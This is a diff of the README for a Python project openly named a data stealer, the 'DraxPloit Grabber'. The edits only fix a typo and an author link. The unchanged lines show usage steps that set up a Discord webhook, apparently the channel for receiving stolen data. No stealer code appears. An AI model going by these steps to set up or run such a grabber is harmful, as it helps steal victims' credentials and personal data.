@@ -28,7 +28,7 @@ Data Stealer written in **Python**
 
 ## Usage
 
-1. Create a Discord Server and enter your setting
+1. Create a Discord Server and enter your settings
 2. Go to "Integrations" and click on "Create Webhook"
 3. Set a webhook name and the specified text channel
 4. Copy the Webhook URL (!!!)
@@ -37,7 +37,7 @@ Data Stealer written in **Python**
 
 ## Authors
 
-* **Drax** - *DraxPloit Grabber* - [Drax](https://github.com/DraxFM)
+* [**Drax**](https://github.com/DraxFM) - *DraxPloit Grabber*
 
 **Discord: Drax#5934**
 
